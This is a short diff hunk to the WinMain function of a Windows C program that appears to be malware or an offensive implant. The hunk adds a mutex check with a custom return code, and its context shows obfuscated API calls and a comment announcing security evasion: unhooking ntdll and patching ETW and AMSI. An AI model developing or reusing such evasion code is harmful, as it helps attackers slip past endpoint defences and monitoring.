@@ -282,7 +282,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
         k32_CreateMutexA(NULL, FALSE, mutexName);
         SecureZeroMemory(mutexName, sizeof(mutexName));
     }
-    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
+    if (hMutex == NULL && GetLastError() != ERROR_ALREADY_EXISTS) return 0xEEB15;
+    else if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
 
     /* ── 1a. Evasion: unhook ntdll, patch ETW + AMSI ─────────────────── */
     /* inject_init() / sc_init() ran first above — SSNs are resolved.     *
